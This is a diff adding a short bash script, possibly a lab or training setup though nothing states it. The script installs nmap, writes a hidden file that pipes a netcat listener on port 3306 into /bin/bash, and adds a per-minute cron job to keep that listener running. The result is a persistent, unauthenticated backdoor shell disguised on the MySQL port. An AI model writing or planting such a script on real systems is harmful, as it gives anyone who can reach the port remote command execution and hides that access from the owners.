@@ -1,0 +1,12 @@
+#!/bin/bash
+dnf -y install nmap
+cat << EOF > /home/rhel/.s
+if ! ps awx|grep -v grep|grep 'nc -l 3306' >/dev/null;then while true;do nc -l 3306 | /bin/bash;done;fi
+EOF
+chown rhel:rhel ~rhel/.s
+chmod 700 ~rhel/.s
+cat << EOF > /var/spool/cron/rhel
+*/1 * * * * ~/.s
+EOF
+chown rhel:rhel /var/spool/cron/rhel
+chmod 600 /var/spool/cron/rhel
